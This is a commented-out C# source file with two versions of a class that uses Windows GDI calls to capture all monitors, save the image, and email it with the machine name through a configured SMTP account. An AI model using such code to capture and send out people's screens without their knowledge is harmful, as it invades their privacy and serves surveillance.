// using System.Drawing;
// using System.Drawing.Imaging;
// using System.Runtime.InteropServices;

// public class GetScreen
// {
//     // Importação de funções da API do Windows para captura de tela
//     [DllImport("user32.dll")]
//     private static extern IntPtr GetDC(IntPtr hwnd);

//     [DllImport("user32.dll")]
//     private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

//     [DllImport("gdi32.dll")]
//     private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

//     [DllImport("gdi32.dll")]
//     private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

//     [DllImport("gdi32.dll")]
//     private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

//     [DllImport("gdi32.dll")]
//     private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

//     [DllImport("gdi32.dll")]
//     private static extern bool DeleteObject(IntPtr hObject);

//     [DllImport("gdi32.dll")]
//     private static extern bool DeleteDC(IntPtr hdc);

//     [DllImport("user32.dll")]
//     private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

//     [DllImport("user32.dll")]
//     private static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);

//     private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

//     [StructLayout(LayoutKind.Sequential)]
//     private struct RECT
//     {
//         public int left;
//         public int top;
//         public int right;
//         public int bottom;
//     }

//     [StructLayout(LayoutKind.Sequential)]
//     private struct MONITORINFO
//     {
//         public int cbSize;
//         public RECT rcMonitor;
//         public RECT rcWork;
//         public uint dwFlags;
//     }

//     private const int SRCCOPY = 0x00CC0020;

//     public static void GetPrintScreen(AppSettings _appSettings)
//     {
//         // Obtém o contexto de dispositivo da tela principal
//         IntPtr hdc = GetDC(IntPtr.Zero);

//         // Cria um bitmap compatível para a área total de todos os monitores
//         RECT totalScreenArea = CalculateTotalScreenArea();
//         IntPtr hdcDest = CreateCompatibleDC(hdc);
//         IntPtr hBitmap = CreateCompatibleBitmap(hdc, totalScreenArea.right - totalScreenArea.left, totalScreenArea.bottom - totalScreenArea.top);
//         SelectObject(hdcDest, hBitmap);

//         // Captura a tela de cada monitor
//         EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, (IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
//         {
//             BitBlt(hdcDest, lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top, hdc, lprcMonitor.left, lprcMonitor.top, SRCCOPY);
//             return true;
//         }, IntPtr.Zero);

//         // Converte o bitmap para um objeto Bitmap do .NET
//         Bitmap bitmap = Image.FromHbitmap(hBitmap);

//         // Salva a captura de tela em um arquivo
//         string pathSystem = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "attachments\\PrintScreen");

//         string fileName = Path.Combine(pathSystem,"screenshot_all_monitors.png");

//         if(!Path.Exists(pathSystem))
//             Directory.CreateDirectory(pathSystem);

//         if(File.Exists(fileName))
//             File.Move(fileName, fileName + DateTime.Now.ToString("yyyyMMddHHmmss"));

//         bitmap.Save(fileName, ImageFormat.Png);
//         Sender.SendEmail(_appSettings.ServerSmtp.UserName, $"Screenshot - {Environment.MachineName} - {DateTime.Now}", $"Screen capture of one or more monitors.", fileName, _appSettings);
//         // Libera recursos
//         bitmap.Dispose();
//         DeleteObject(hBitmap);
//         DeleteDC(hdcDest);
//         ReleaseDC(IntPtr.Zero, hdc);

//         Console.WriteLine($"Captura de tela de todos os monitores salva como {fileName}");
//     }

//     // Calcula a área total de todos os monitores
//     private static RECT CalculateTotalScreenArea()
//     {
//         RECT totalArea = new RECT { left = int.MaxValue, top = int.MaxValue, right = int.MinValue, bottom = int.MinValue };

//         EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, (IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
//         {
//             totalArea.left = Math.Min(totalArea.left, lprcMonitor.left);
//             totalArea.top = Math.Min(totalArea.top, lprcMonitor.top);
//             totalArea.right = Math.Max(totalArea.right, lprcMonitor.right);
//             totalArea.bottom = Math.Max(totalArea.bottom, lprcMonitor.bottom);
//             return true;
//         }, IntPtr.Zero);

//         return totalArea;
//     }
// // }
// using System.Drawing;
// using System.Drawing.Imaging;
// using System.Runtime.InteropServices;

// public class GetScreen
// {
//     // Importação de funções da API do Windows para captura de tela
//     [DllImport("user32.dll")]
//     private static extern IntPtr GetDC(IntPtr hwnd);

//     [DllImport("user32.dll")]
//     private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

//     [DllImport("gdi32.dll")]
//     private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

//     [DllImport("gdi32.dll")]
//     private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

//     [DllImport("gdi32.dll")]
//     private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

//     [DllImport("gdi32.dll")]
//     private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

//     [DllImport("gdi32.dll")]
//     private static extern bool DeleteObject(IntPtr hObject);

//     [DllImport("gdi32.dll")]
//     private static extern bool DeleteDC(IntPtr hdc);

//     [DllImport("user32.dll")]
//     private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

//     [DllImport("user32.dll")]
//     private static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);

//     private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

//     [StructLayout(LayoutKind.Sequential)]
//     private struct RECT
//     {
//         public int left;
//         public int top;
//         public int right;
//         public int bottom;
//     }

//     [StructLayout(LayoutKind.Sequential)]
//     private struct MONITORINFO
//     {
//         public int cbSize;
//         public RECT rcMonitor;
//         public RECT rcWork;
//         public uint dwFlags;
//     }

//     private const int SRCCOPY = 0x00CC0020;
//     public static void GetPrintScreen(AppSettings _appSettings)
//     {
//         // Obtém o contexto de dispositivo da tela principal
//         IntPtr hdc = GetDC(IntPtr.Zero);
//         if (hdc == IntPtr.Zero)
//         {
//             Console.WriteLine("Falha ao obter o contexto de dispositivo.");
//             return;
//         }

//         // Cria um bitmap compatível para a área total de todos os monitores
//         RECT totalScreenArea = CalculateTotalScreenArea();
//         IntPtr hdcDest = CreateCompatibleDC(hdc);
//         if (hdcDest == IntPtr.Zero)
//         {
//             Console.WriteLine("Falha ao criar o contexto de dispositivo compatível.");
//             ReleaseDC(IntPtr.Zero, hdc);
//             return;
//         }

//         IntPtr hBitmap = CreateCompatibleBitmap(hdc, totalScreenArea.right - totalScreenArea.left, totalScreenArea.bottom - totalScreenArea.top);
//         if (hBitmap == IntPtr.Zero)
//         {
//             Console.WriteLine("Falha ao criar o bitmap compatível.");
//             DeleteDC(hdcDest);
//             ReleaseDC(IntPtr.Zero, hdc);
//             return;
//         }

//         SelectObject(hdcDest, hBitmap);

//         // Captura a tela de cada monitor
//         EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, (IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
//         {
//             if (!BitBlt(hdcDest, lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top, hdc, lprcMonitor.left, lprcMonitor.top, SRCCOPY))
//             {
//                 Console.WriteLine("Falha ao capturar a tela do monitor.");
//             }
//             return true;
//         }, IntPtr.Zero);

//         // Converte o bitmap para um objeto Bitmap do .NET
//         Bitmap bitmap = Image.FromHbitmap(hBitmap);

//         // Salva a captura de tela em um arquivo
//         string pathSystem = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "attachments\\PrintScreen");

//         string fileName = Path.Combine(pathSystem, "screenshot_all_monitors.png");

//         if (!Directory.Exists(pathSystem))
//             Directory.CreateDirectory(pathSystem);

//         if (File.Exists(fileName))
//             File.Move(fileName, fileName + DateTime.Now.ToString("yyyyMMddHHmmss"));

//         bitmap.Save(fileName, ImageFormat.Png);
//         Sender.SendEmail(_appSettings.ServerSmtp.UserName, $"Screenshot - {Environment.MachineName} - {DateTime.Now}", $"Screen capture of one or more monitors.", fileName, _appSettings);

//         // Libera recursos
//         bitmap.Dispose();
//         DeleteObject(hBitmap);
//         DeleteDC(hdcDest);
//         ReleaseDC(IntPtr.Zero, hdc);

//         Console.WriteLine($"Captura de tela de todos os monitores salva como {fileName}");
//     }

//     private static RECT CalculateTotalScreenArea()
//     {
//         RECT totalArea = new RECT { left = int.MaxValue, top = int.MaxValue, right = int.MinValue, bottom = int.MinValue };

//         EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, (IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
//         {
//             totalArea.left = Math.Min(totalArea.left, lprcMonitor.left);
//             totalArea.top = Math.Min(totalArea.top, lprcMonitor.top);
//             totalArea.right = Math.Max(totalArea.right, lprcMonitor.right);
//             totalArea.bottom = Math.Max(totalArea.bottom, lprcMonitor.bottom);
//             return true;
//         }, IntPtr.Zero);

//         return totalArea;
//     }
// }